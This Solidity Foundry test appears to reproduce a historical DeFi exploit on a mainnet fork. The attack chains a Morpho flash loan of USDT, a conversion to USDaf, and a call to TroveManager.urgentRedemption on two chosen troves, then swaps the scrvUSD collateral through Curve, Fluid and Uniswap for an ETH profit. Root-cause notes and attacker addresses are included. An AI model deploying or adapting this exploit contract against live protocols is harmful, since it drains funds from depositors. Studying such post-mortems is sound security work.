// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 4,204.55 USD
// Attacker : 0x4cf8ed875e508c3acd60e56a1ca21395d106bc94
// Attack Contract : 0x5f3697bb418a55e941d14f4def8d18be73d66309
// Vulnerable Contract : 0xd7954a8c7fa74c97ad2545719ce82eae915d73f7
// Attack Tx : https://etherscan.io/tx/0x0cf19b3f83f574c1911eb42457f22578359483dfef197f8906678bc0a76a740b
//
// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xd7954a8c7fa74c97ad2545719ce82eae915d73f7#code
//
// @Analysis
// Telegram Alert : https://t.me/defimon_alerts/1415
//
// Attack summary: the attacker flash-borrowed USDT, converted it into USDaf, and used
// TroveManager.urgentRedemption to redeem selected undercollateralized troves for scrvUSD
// collateral. The returned collateral was routed through Curve, Fluid, and Uniswap to repay
// the flash loan and keep the WETH/ETH surplus.
// Root cause: once the branch was shut down, public urgentRedemption let any USDaf holder
// choose profitable troves and redeem their debt for ActivePool collateral with a bonus.

address constant ATTACKER = 0x4cF8ED875E508c3Acd60E56A1ca21395D106bc94;
address constant HISTORICAL_ATTACK_CONTRACT = 0x5F3697Bb418a55E941d14f4Def8d18Be73D66309;
address constant MORPHO = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
address constant USDT_TOKEN = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
address constant CURVE_USDT_USDAF_LP = 0x4f493B7dE8aAC7d55F71853688b1F7C8F0243C85;
address constant CURVE_USDAF_POOL = 0x95591348FE9718bE8bfa3afcC9b017D9Ec18A7fa;
address constant TROVE_MANAGER = 0xa0290af48d2E43162A1a05Ab9d01a4ca3a8B60CB;
address constant ACTIVE_POOL = 0xD7954A8c7FA74c97aD2545719cE82EAE915d73f7;
address constant USDAF = 0x85E30b8b263bC64d94b827ed450F2EdFEE8579dA;
address constant SCRVUSD = 0x0655977FEb2f289A4aB78af67BAB0d17aAb84367;
address constant CURVE_SCRVUSD_SUSDE_POOL = 0xd29f8980852c2c76fC3f6E96a7Aa06E0BedCC1B1;
address constant SUSDE = 0x9D39A5DE30e57443BfF2A8307A4256c8797A3497;
address constant FLUID_DEX = 0x1DD125C32e4B5086c63CC13B3cA02C4A2a61Fa9b;
address constant UNISWAP_V3_ROUTER = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
address constant WETH_TOKEN = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

uint256 constant FLASH_USDT_AMOUNT = 225_000_000_000;
uint256 constant HISTORICAL_ETH_PROFIT = 1_669_775_970_301_739_864;
uint256 constant HISTORICAL_SWAP_DEADLINE = 1_751_758_035;

interface IMorphoFlashLoan1415 {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

interface IUSDT1415 {
    function approve(address spender, uint256 amount) external;
}

interface ICurvePool1415 {
    function add_liquidity(uint256[] calldata amounts, uint256 minMintAmount) external returns (uint256);
    function exchange(int128 i, int128 j, uint256 dx, uint256 minDy, address receiver) external returns (uint256);
}

interface ITroveManager1415 {
    function urgentRedemption(uint256 boldAmount, uint256[] calldata troveIds, uint256 minCollateral) external;
}

interface IFluidDex1415 {
    function swapIn(bool swap0to1, uint256 amountIn, uint256 amountOutMin, address to)
        external
        payable
        returns (uint256 amountOut);
}

interface IUniswapV3Router1415 {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(
        ExactInputSingleParams calldata params
    ) external payable returns (uint256 amountOut);
}

interface IWETH1415 {
    function withdraw(
        uint256 amount
    ) external;
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        vm.createSelectFork("mainnet", 22_856_272);
        vm.roll(22_856_273);
        vm.warp(1_751_757_935);

        fundingToken = address(0);
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker");
        vm.label(HISTORICAL_ATTACK_CONTRACT, "Historical attack contract");
        vm.label(MORPHO, "Morpho flash lender");
        vm.label(USDT_TOKEN, "USDT");
        vm.label(CURVE_USDT_USDAF_LP, "Curve Strategic USD Reserves LP");
        vm.label(CURVE_USDAF_POOL, "Curve USDaf pool");
        vm.label(TROVE_MANAGER, "TroveManager");
        vm.label(ACTIVE_POOL, "ActivePool");
        vm.label(USDAF, "USDaf");
        vm.label(SCRVUSD, "scrvUSD");
        vm.label(CURVE_SCRVUSD_SUSDE_POOL, "Curve scrvUSD/sUSDe pool");
        vm.label(SUSDE, "sUSDe");
        vm.label(FLUID_DEX, "Fluid DEX");
        vm.label(UNISWAP_V3_ROUTER, "Uniswap V3 router");
        vm.label(WETH_TOKEN, "WETH");
    }

    function testExploit() public balanceLog {
        uint256 attackerEthBefore = ATTACKER.balance;

        ActivePoolScrvUsdUrgentRedemptionAttack template =
            new ActivePoolScrvUsdUrgentRedemptionAttack(ATTACKER);
        vm.etch(HISTORICAL_ATTACK_CONTRACT, address(template).code);
        vm.deal(HISTORICAL_ATTACK_CONTRACT, 0);

        vm.prank(ATTACKER);
        ActivePoolScrvUsdUrgentRedemptionAttack(payable(HISTORICAL_ATTACK_CONTRACT)).execute();

        assertEq(ATTACKER.balance - attackerEthBefore, HISTORICAL_ETH_PROFIT);
    }
}

contract ActivePoolScrvUsdUrgentRedemptionAttack {
    address private immutable profitReceiver;

    constructor(
        address receiver
    ) {
        profitReceiver = receiver;
    }

    receive() external payable {}

    function execute() external {
        bytes memory data = abi.encode(UNISWAP_V3_ROUTER, WETH_TOKEN, USDAF);
        IMorphoFlashLoan1415(MORPHO).flashLoan(USDT_TOKEN, FLASH_USDT_AMOUNT, data);

        (bool ok,) = payable(profitReceiver).call{value: address(this).balance}("");
        require(ok, "profit transfer failed");
    }

    function onMorphoFlashLoan(uint256 amount, bytes calldata) external {
        require(msg.sender == MORPHO, "only Morpho");
        require(amount == FLASH_USDT_AMOUNT, "amount");

        IUSDT1415(USDT_TOKEN).approve(CURVE_USDT_USDAF_LP, amount);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 0;
        amounts[1] = amount;
        uint256 curveLp = ICurvePool1415(CURVE_USDT_USDAF_LP).add_liquidity(amounts, 0);

        IERC20(CURVE_USDT_USDAF_LP).approve(CURVE_USDAF_POOL, curveLp);
        uint256 usdafAmount = ICurvePool1415(CURVE_USDAF_POOL).exchange(1, 0, curveLp, 0, address(this));

        IERC20(USDAF).approve(TROVE_MANAGER, usdafAmount);
        uint256[] memory troveIds = new uint256[](2);
        troveIds[0] = 0xeab7e86e94580e41de568bacb5a45656789f530905fd9cbee859eecefef614ae;
        troveIds[1] = 0xc951b81db2da0f1173c6978cda19ec40bef298d33f3888d2d8845ded3d44e560;
        ITroveManager1415(TROVE_MANAGER).urgentRedemption(usdafAmount, troveIds, 0);

        uint256 scrvUsdBalance = IERC20(SCRVUSD).balanceOf(address(this));
        IERC20(SCRVUSD).approve(CURVE_SCRVUSD_SUSDE_POOL, scrvUsdBalance);
        uint256 susdeAmount = ICurvePool1415(CURVE_SCRVUSD_SUSDE_POOL).exchange(0, 1, scrvUsdBalance, 0, address(this));

        IERC20(SUSDE).approve(FLUID_DEX, susdeAmount);
        IFluidDex1415(FLUID_DEX).swapIn(true, susdeAmount, 1, address(this));

        uint256 usdtSurplus = IERC20(USDT_TOKEN).balanceOf(address(this)) - FLASH_USDT_AMOUNT;
        IUSDT1415(USDT_TOKEN).approve(UNISWAP_V3_ROUTER, usdtSurplus);
        IUniswapV3Router1415(UNISWAP_V3_ROUTER).exactInputSingle(
            IUniswapV3Router1415.ExactInputSingleParams({
                tokenIn: USDT_TOKEN,
                tokenOut: WETH_TOKEN,
                fee: 3000,
                recipient: address(this),
                deadline: HISTORICAL_SWAP_DEADLINE,
                amountIn: usdtSurplus,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );

        uint256 wethBalance = IERC20(WETH_TOKEN).balanceOf(address(this));
        IWETH1415(WETH_TOKEN).withdraw(wethBalance);

        IUSDT1415(USDT_TOKEN).approve(MORPHO, FLASH_USDT_AMOUNT);
    }
}
